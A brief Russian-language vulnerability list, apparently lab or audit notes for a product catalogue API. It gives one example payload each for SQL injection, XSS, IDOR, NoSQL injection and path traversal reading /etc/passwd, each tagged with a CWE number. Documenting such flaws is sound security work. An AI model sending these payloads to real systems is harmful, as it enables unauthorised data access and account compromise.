## 🔴 Уязвимости в каталоге

### 1. SQL Injection в фильтре
```javascript
/api/products?category=electronics' OR 1=1--
```
**CWE-89**

### 2. XSS через подкатегорию
```javascript
subcategory: "<img src=x onerror=alert(1)>"
```
**CWE-79**

### 3. IDOR - скрытые категории
```javascript
/api/categories/999 // VIP категория
```
**CWE-639**

### 4. NoSQL Injection
```javascript
/api/products/search?category[$ne]=null
```
**CWE-943**

### 5. Path Traversal
```javascript
/api/category/icon?file=../../../etc/passwd
```
**CWE-22**
